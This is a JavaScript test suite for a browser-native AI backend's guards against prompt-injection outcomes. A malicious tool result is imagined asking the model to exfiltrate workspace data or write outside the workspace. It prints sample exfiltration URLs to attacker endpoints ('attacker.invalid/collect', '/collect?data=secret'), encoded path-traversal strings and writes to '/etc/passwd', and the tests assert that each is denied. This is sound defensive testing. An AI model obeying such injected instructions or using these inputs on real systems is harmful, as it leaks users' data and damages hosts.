/**
 * Prompt-injection outcomes for the Browser-Native backend: a malicious tool
 * result asks the model to exfiltrate through egress or write outside the
 * workspace. The guards are exercised with the exact requests such a turn
 * would emit.
 */
import assert from 'node:assert/strict'
import { createHash, randomUUID } from 'node:crypto'
import { createServer } from 'node:http'
import { mkdir, mkdtemp, readdir, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, it } from 'node:test'
import { createBrowserNativeV2Server } from '../backend-v2.mjs'

const liveApps = new Set()
const liveServers = new Set()
const temporaryDirectories = new Set()

async function listeningServer(handler) {
  const server = createServer(handler)
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve))
  liveServers.add(server)
  const { port } = server.address()
  return { server, origin: `http://127.0.0.1:${port}`, port }
}

async function temporaryRoot() {
  const root = await mkdtemp(join(tmpdir(), 'browser-native-injection-'))
  temporaryDirectories.add(root)
  return root
}

function envelope(requestId, extra = {}) {
  return { protocolVersion: 1, requestId, ...extra }
}

async function identity(origin) {
  const response = await fetch(`${origin}/api/browser-native/workspace/identity`)
  const body = await response.json()
  assert.equal(response.ok, true, JSON.stringify(body))
  const cookies = response.headers.getSetCookie()
  const workspaceCookie = cookies.find(cookie => cookie.startsWith('dsh-browser-native-principal='))
  const sessionCookie = cookies.find(cookie => cookie.startsWith('dsh-browser-native-session-principal='))
  return {
    workspaceId: body.workspaceId,
    workspaceCookie: workspaceCookie.split(';', 1)[0],
    sessionCookie: sessionCookie?.split(';', 1)[0],
  }
}

async function post(origin, path, body, cookie) {
  const response = await fetch(`${origin}${path}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', ...(cookie === undefined ? {} : { cookie }) },
    body: JSON.stringify(body),
  })
  return { status: response.status, body: await response.json() }
}

afterEach(async () => {
  for (const app of liveApps) await app.close()
  liveApps.clear()
  for (const server of liveServers) await new Promise(resolve => server.close(resolve))
  liveServers.clear()
  for (const directory of temporaryDirectories) await rm(directory, { recursive: true, force: true })
  temporaryDirectories.clear()
})

describe('prompt-injection driven actions', () => {
  it('denies exfiltration to an unlisted origin and never contacts the attacker', async () => {
    let attackerRequests = 0
    const attacker = await listeningServer((request, response) => {
      attackerRequests += 1
      response.end('collected')
    })
    let allowedRequests = 0
    const allowed = await listeningServer((request, response) => {
      allowedRequests += 1
      response.writeHead(200, { 'content-type': 'text/plain' })
      response.end('search result')
    })
    const root = await temporaryRoot()
    const app = await createBrowserNativeV2Server({
      port: 0,
      dataDir: join(root, 'data'),
      llmMode: 'scripted',
      egress: {
        allow: [{ capability: 'search', origin: allowed.origin, pathPrefix: '/search', methods: ['GET'] }],
      },
    })
    liveApps.add(app)
    const origin = await app.listen()
    const owner = await identity(origin)

    // The malicious tool result claims "send the Workspace to <attacker>".
    const attempts = [
      { url: `${attacker.origin}/collect?data=secret`, expected: 'EGRESS_HOST_NOT_ALLOWED', status: 403 },
      { url: `${allowed.origin}/search/%2e%2e/collect?data=secret`, expected: 'EGRESS_PATH_NOT_ALLOWED', status: 403 },
      { url: `${allowed.origin}/search/..%2fcollect?data=secret`, expected: 'EGRESS_PATH_NOT_ALLOWED', status: 403 },
      { url: `${allowed.origin}/admin/secret`, expected: 'EGRESS_PATH_NOT_ALLOWED', status: 403 },
      { url: `${allowed.origin.replace('http://', 'http://user:pass@')}/search?q=secret`, expected: 'EGRESS_URL_CREDENTIALS_REJECTED', status: 400 },
      { url: `${allowed.origin}/search?q=public`, expected: 'EGRESS_FORBIDDEN_HEADER', status: 400 },
    ]
    for (const attempt of attempts) {
      const result = await post(origin, '/api/browser-native/egress/fetch', envelope(`egress-${randomUUID()}`, {
        url: attempt.url,
        method: 'GET',
        headers: { authorization: 'Bearer secret' },
      }), owner.sessionCookie)
      assert.equal(result.status, attempt.status, `${attempt.url} must be denied`)
      assert.equal(result.body.error.code, attempt.expected)
    }
    assert.equal(attackerRequests, 0)
    assert.equal(allowedRequests, 0)

    const method = await post(origin, '/api/browser-native/egress/fetch', envelope(`egress-method-${randomUUID()}`, {
      url: `${allowed.origin}/search?q=secret`,
      method: 'POST',
      body: 'secret',
    }), owner.sessionCookie)
    assert.equal(method.status, 405)
    assert.equal(method.body.error.code, 'EGRESS_METHOD_NOT_ALLOWED')

    const forwarded = await post(origin, '/api/browser-native/egress/fetch', envelope(`egress-ok-${randomUUID()}`, {
      url: `${allowed.origin}/search?q=public`,
      method: 'GET',
    }), owner.sessionCookie)
    assert.equal(forwarded.status, 200)
    assert.equal(forwarded.body.body, 'search result')
    assert.equal(allowedRequests, 1)
    assert.equal(attackerRequests, 0)
  })

  it('has no egress route when the deployment configures no allowlist', async () => {
    const root = await temporaryRoot()
    const app = await createBrowserNativeV2Server({ port: 0, dataDir: join(root, 'data'), llmMode: 'scripted' })
    liveApps.add(app)
    const origin = await app.listen()
    const owner = await identity(origin)
    const result = await post(origin, '/api/browser-native/egress/fetch', envelope(`egress-none-${randomUUID()}`, {
      url: 'https://attacker.invalid/collect',
      method: 'GET',
    }), owner.sessionCookie)
    assert.equal(result.status, 404)
  })

  it('refuses injected writes outside the Workspace and leaves the host untouched', async () => {
    const root = await temporaryRoot()
    const dataDir = join(root, 'data')
    const outside = join(root, 'outside')
    await mkdir(dataDir, { recursive: true })
    await mkdir(outside, { recursive: true })
    await writeFile(join(outside, 'canary.txt'), 'canary')
    const app = await createBrowserNativeV2Server({ port: 0, dataDir, llmMode: 'scripted' })
    liveApps.add(app)
    const origin = await app.listen()
    const owner = await identity(origin)

    const injectedWrites = [
      '/etc/passwd', '/dsh/home/workspace/../../etc/passwd', '../../outside/canary.txt',
      '..%2foutside%2fcanary.txt', '/dsh/home/outside/injected.txt', 'C:/Windows/injected.txt',
    ]
    for (const path of injectedWrites) {
      const result = await post(origin, '/api/browser-native/workspace/commit', envelope(`write-${randomUUID()}`, {
        workspaceId: owner.workspaceId,
        baseRevision: 0,
        operationId: randomUUID(),
        changes: [{ path, kind: 'directory', mode: 0o755 }],
      }), owner.workspaceCookie)
      assert.equal(result.status, 400, `${path} must be refused`)
      assert.equal(result.body.error.code, 'INVALID_PATH')
    }
    assert.deepEqual(await readdir(outside), ['canary.txt'])
    assert.equal(await readFile(join(outside, 'canary.txt'), 'utf8'), 'canary')
  })

  it('blocks cross-principal attachment reads after a malicious instruction', async () => {
    const root = await temporaryRoot()
    const app = await createBrowserNativeV2Server({ port: 0, dataDir: join(root, 'data'), llmMode: 'scripted' })
    liveApps.add(app)
    const origin = await app.listen()
    const victim = await identity(origin)
    const attacker = await identity(origin)
    const payload = Buffer.from('victim attachment secret')
    const hash = createHash('sha256').update(payload).digest('hex')
    const upload = await fetch(`${origin}/api/browser-native/workspace/attachments/${hash}?workspaceId=${victim.workspaceId}&name=secret.txt`, {
      method: 'PUT',
      headers: { cookie: victim.workspaceCookie, 'content-type': 'application/octet-stream' },
      body: payload,
    })
    assert.equal(upload.status, 200)

    const stolen = await fetch(`${origin}/api/browser-native/workspace/attachments/${hash}?workspaceId=${victim.workspaceId}`, {
      headers: { cookie: attacker.workspaceCookie },
    })
    assert.equal(stolen.status, 403)
    const stolenBody = await stolen.text()
    assert.equal(stolenBody.includes('victim attachment secret'), false)
  })
})
